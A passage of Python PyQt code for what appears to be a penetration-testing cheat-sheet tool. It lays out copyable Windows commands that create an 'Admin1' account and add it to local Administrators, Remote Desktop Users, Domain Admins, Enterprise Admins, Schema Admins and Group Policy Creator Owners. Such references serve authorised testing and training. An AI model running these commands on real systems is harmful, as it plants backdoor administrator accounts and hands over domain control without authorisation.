        self.wpe_19_spacer2 = QLabel()
        self.wpe_19_spacer2.setFixedWidth(40)
        self.wpe_19_spacer2.setFixedHeight(50)
     
        # wpe_19 spacer & divider layout
        self.tab4_container_layout.insertWidget(251, self.wpe_19_spacer1)
        self.tab4_container_layout.insertWidget(252, self.wpe_19_divider1)
        self.tab4_container_layout.insertWidget(253, self.wpe_19_divider2)
        self.tab4_container_layout.insertWidget(254, self.wpe_19_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_19_Scan2
        if hasattr(self, 'wpe_19_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan2)
            self.wpe_19_Scan2.deleteLater()
        self.wpe_19_Scan2 = QLabel("cmd.exe /c net localgroup administrators Admin1 /add")
        self.wpe_19_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(255,self.wpe_19_Scan2)
     
        # wpe_19_Scan2_Copy
        if hasattr(self, 'wpe_19_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan2_Copy)
            self.wpe_19_Scan2_Copy.deleteLater()
        self.wpe_19_Scan2_Copy = QPushButton()
        self.wpe_19_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_19_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_19_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_19_Scan2.text()))
        self.wpe_19_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_19_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_19_Scan2_Copy)
        label_layout.addWidget(self.wpe_19_Scan2)
        self.tab4_container_layout.insertLayout(256, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_19_divider1
        if hasattr(self, 'wpe_19_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider1)
            self.wpe_19_divider1.deleteLater()
        self.wpe_19_divider1 = QFrame()
        self.wpe_19_divider1.setFrameShape(QFrame.HLine)
        self.wpe_19_divider1.setLineWidth(3)
        self.wpe_19_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_19_divider2
        if hasattr(self, 'wpe_19_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider2)
            self.wpe_19_divider2.deleteLater()
        self.wpe_19_divider2 = QFrame()
        self.wpe_19_divider2.setFrameShape(QFrame.HLine)
        self.wpe_19_divider2.setLineWidth(3)
        self.wpe_19_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_19_spacer1
        if hasattr(self, 'wpe_19_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer1)
            self.wpe_19_spacer1.deleteLater()
        self.wpe_19_spacer1 = QLabel()
        self.wpe_19_spacer1.setFixedWidth(40)
        self.wpe_19_spacer1.setFixedHeight(50)
     
        # wpe_19_spacer2
        if hasattr(self, 'wpe_19_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer2)
            self.wpe_19_spacer2.deleteLater()
        self.wpe_19_spacer2 = QLabel()
        self.wpe_19_spacer2.setFixedWidth(40)
        self.wpe_19_spacer2.setFixedHeight(50)
     
        # wpe_19 spacer & divider layout
        self.tab4_container_layout.insertWidget(257, self.wpe_19_spacer1)
        self.tab4_container_layout.insertWidget(258, self.wpe_19_divider1)
        self.tab4_container_layout.insertWidget(259, self.wpe_19_divider2)
        self.tab4_container_layout.insertWidget(260, self.wpe_19_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_19_Scan3
        if hasattr(self, 'wpe_19_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan3)
            self.wpe_19_Scan3.deleteLater()
        self.wpe_19_Scan3 = QLabel("cmd.exe /c net localgroup \"Remote Desktop Users\" Admin1 /add")
        self.wpe_19_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(261,self.wpe_19_Scan3)
     
        # wpe_19_Scan3_Copy
        if hasattr(self, 'wpe_19_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_19_Scan3_Copy)
            self.wpe_19_Scan3_Copy.deleteLater()
        self.wpe_19_Scan3_Copy = QPushButton()
        self.wpe_19_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_19_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_19_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_19_Scan3.text()))
        self.wpe_19_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_19_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_19_Scan3_Copy)
        label_layout.addWidget(self.wpe_19_Scan3)
        self.tab4_container_layout.insertLayout(262, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_19_divider1
        if hasattr(self, 'wpe_19_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider1)
            self.wpe_19_divider1.deleteLater()
        self.wpe_19_divider1 = QFrame()
        self.wpe_19_divider1.setFrameShape(QFrame.HLine)
        self.wpe_19_divider1.setLineWidth(3)
        self.wpe_19_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_19_divider2
        if hasattr(self, 'wpe_19_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_divider2)
            self.wpe_19_divider2.deleteLater()
        self.wpe_19_divider2 = QFrame()
        self.wpe_19_divider2.setFrameShape(QFrame.HLine)
        self.wpe_19_divider2.setLineWidth(3)
        self.wpe_19_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_19_spacer1
        if hasattr(self, 'wpe_19_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer1)
            self.wpe_19_spacer1.deleteLater()
        self.wpe_19_spacer1 = QLabel()
        self.wpe_19_spacer1.setFixedWidth(40)
        self.wpe_19_spacer1.setFixedHeight(50)
     
        # wpe_19_spacer2
        if hasattr(self, 'wpe_19_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_19_spacer2)
            self.wpe_19_spacer2.deleteLater()
        self.wpe_19_spacer2 = QLabel()
        self.wpe_19_spacer2.setFixedWidth(40)
        self.wpe_19_spacer2.setFixedHeight(50)
     
        # wpe_19 spacer & divider layout
        self.tab4_container_layout.insertWidget(263, self.wpe_19_spacer1)
        self.tab4_container_layout.insertWidget(264, self.wpe_19_divider1)
        self.tab4_container_layout.insertWidget(265, self.wpe_19_divider2)
        self.tab4_container_layout.insertWidget(266, self.wpe_19_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_20
        if hasattr(self, 'wpe_20'):
            self.tab4_container_layout.removeWidget(self.wpe_20)
            self.wpe_20.deleteLater()
        self.wpe_20 = QLabel("[ + Adding a Windows Domain Administrator from the Command Line ]")
        self.wpe_20.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(267,self.wpe_20)
     
        # wpe_20_Scan1
        if hasattr(self, 'wpe_20_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan1)
            self.wpe_20_Scan1.deleteLater()
        self.wpe_20_Scan1 = QLabel("cmd.exe /c net user Admin1 Password123! /add")
        self.wpe_20_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(268,self.wpe_20_Scan1)
     
        # wpe_20_Scan1_Copy
        if hasattr(self, 'wpe_20_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan1_Copy)
            self.wpe_20_Scan1_Copy.deleteLater()
        self.wpe_20_Scan1_Copy = QPushButton()
        self.wpe_20_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan1.text()))
        self.wpe_20_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan1_Copy)
        label_layout.addWidget(self.wpe_20_Scan1)
        self.tab4_container_layout.insertLayout(269, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(270, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(271, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(272, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(273, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan2
        if hasattr(self, 'wpe_20_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan2)
            self.wpe_20_Scan2.deleteLater()
        self.wpe_20_Scan2 = QLabel("net localgroup Administrators Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(274,self.wpe_20_Scan2)
     
        # wpe_20_Scan2_Copy
        if hasattr(self, 'wpe_20_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan2_Copy)
            self.wpe_20_Scan2_Copy.deleteLater()
        self.wpe_20_Scan2_Copy = QPushButton()
        self.wpe_20_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan2.text()))
        self.wpe_20_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan2_Copy)
        label_layout.addWidget(self.wpe_20_Scan2)
        self.tab4_container_layout.insertLayout(275, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(276, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(277, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(278, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(279, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan3
        if hasattr(self, 'wpe_20_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan3)
            self.wpe_20_Scan3.deleteLater()
        self.wpe_20_Scan3 = QLabel("net localgroup \"Remote Desktop Users\" Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(280,self.wpe_20_Scan3)
     
        # wpe_20_Scan3_Copy
        if hasattr(self, 'wpe_20_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan3_Copy)
            self.wpe_20_Scan3_Copy.deleteLater()
        self.wpe_20_Scan3_Copy = QPushButton()
        self.wpe_20_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan3.text()))
        self.wpe_20_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan3_Copy)
        label_layout.addWidget(self.wpe_20_Scan3)
        self.tab4_container_layout.insertLayout(281, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(282, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(283, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(284, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(285, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan4
        if hasattr(self, 'wpe_20_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan4)
            self.wpe_20_Scan4.deleteLater()
        self.wpe_20_Scan4 = QLabel("net group \"Domain Admins\" Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(286,self.wpe_20_Scan4)
     
        # wpe_20_Scan4_Copy
        if hasattr(self, 'wpe_20_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan4_Copy)
            self.wpe_20_Scan4_Copy.deleteLater()
        self.wpe_20_Scan4_Copy = QPushButton()
        self.wpe_20_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan4.text()))
        self.wpe_20_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan4_Copy)
        label_layout.addWidget(self.wpe_20_Scan4)
        self.tab4_container_layout.insertLayout(287, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(288, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(289, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(290, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(291, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan5
        if hasattr(self, 'wpe_20_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan5)
            self.wpe_20_Scan5.deleteLater()
        self.wpe_20_Scan5 = QLabel("net group \"Enterprise Admins\" Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(292,self.wpe_20_Scan5)
     
        # wpe_20_Scan5_Copy
        if hasattr(self, 'wpe_20_Scan5_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan5_Copy)
            self.wpe_20_Scan5_Copy.deleteLater()
        self.wpe_20_Scan5_Copy = QPushButton()
        self.wpe_20_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan5_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan5.text()))
        self.wpe_20_Scan5_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan5_Copy)
        label_layout.addWidget(self.wpe_20_Scan5)
        self.tab4_container_layout.insertLayout(293, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(294, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(295, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(296, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(297, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan6
        if hasattr(self, 'wpe_20_Scan6'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan6)
            self.wpe_20_Scan6.deleteLater()
        self.wpe_20_Scan6 = QLabel("net group \"Schema Admins\" Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(298,self.wpe_20_Scan6)
     
        # wpe_20_Scan6_Copy
        if hasattr(self, 'wpe_20_Scan6_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan6_Copy)
            self.wpe_20_Scan6_Copy.deleteLater()
        self.wpe_20_Scan6_Copy = QPushButton()
        self.wpe_20_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan6_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan6.text()))
        self.wpe_20_Scan6_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan6_Copy)
        label_layout.addWidget(self.wpe_20_Scan6)
        self.tab4_container_layout.insertLayout(299, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(300, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(301, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(302, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(303, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_Scan7
        if hasattr(self, 'wpe_20_Scan7'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan7)
            self.wpe_20_Scan7.deleteLater()
        self.wpe_20_Scan7 = QLabel("net group \"Group Policy Creator Owners\" Admin1 /ADD /DOMAIN")
        self.wpe_20_Scan7.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(304,self.wpe_20_Scan7)
     
        # wpe_20_Scan7_Copy
        if hasattr(self, 'wpe_20_Scan7_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_20_Scan7_Copy)
            self.wpe_20_Scan7_Copy.deleteLater()
        self.wpe_20_Scan7_Copy = QPushButton()
        self.wpe_20_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_20_Scan7_Copy.setFixedSize(QSize(20,20))
        self.wpe_20_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_20_Scan7.text()))
        self.wpe_20_Scan7_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_20_Scan7 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_20_Scan7_Copy)
        label_layout.addWidget(self.wpe_20_Scan7)
        self.tab4_container_layout.insertLayout(305, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_20_divider1
        if hasattr(self, 'wpe_20_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider1)
            self.wpe_20_divider1.deleteLater()
        self.wpe_20_divider1 = QFrame()
        self.wpe_20_divider1.setFrameShape(QFrame.HLine)
        self.wpe_20_divider1.setLineWidth(3)
        self.wpe_20_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_20_divider2
        if hasattr(self, 'wpe_20_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_divider2)
            self.wpe_20_divider2.deleteLater()
        self.wpe_20_divider2 = QFrame()
        self.wpe_20_divider2.setFrameShape(QFrame.HLine)
        self.wpe_20_divider2.setLineWidth(3)
        self.wpe_20_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_20_spacer1
        if hasattr(self, 'wpe_20_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer1)
            self.wpe_20_spacer1.deleteLater()
        self.wpe_20_spacer1 = QLabel()
        self.wpe_20_spacer1.setFixedWidth(40)
        self.wpe_20_spacer1.setFixedHeight(50)
     
        # wpe_20_spacer2
        if hasattr(self, 'wpe_20_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_20_spacer2)
            self.wpe_20_spacer2.deleteLater()
        self.wpe_20_spacer2 = QLabel()
        self.wpe_20_spacer2.setFixedWidth(40)
        self.wpe_20_spacer2.setFixedHeight(50)
     
        # wpe_20 spacer & divider layout
        self.tab4_container_layout.insertWidget(306, self.wpe_20_spacer1)
        self.tab4_container_layout.insertWidget(307, self.wpe_20_divider1)
        self.tab4_container_layout.insertWidget(308, self.wpe_20_divider2)
        self.tab4_container_layout.insertWidget(309, self.wpe_20_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_21
        if hasattr(self, 'wpe_21'):
            self.tab4_container_layout.removeWidget(self.wpe_21)
            self.wpe_21.deleteLater()
        self.wpe_21 = QLabel("[ + Time and our own Scheduled Tasks ]")
        self.wpe_21.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(310,self.wpe_21)
     
        # wpe_21_Scan1
        if hasattr(self, 'wpe_21_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan1)
            self.wpe_21_Scan1.deleteLater()
        self.wpe_21_Scan1 = QLabel("time")
        self.wpe_21_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
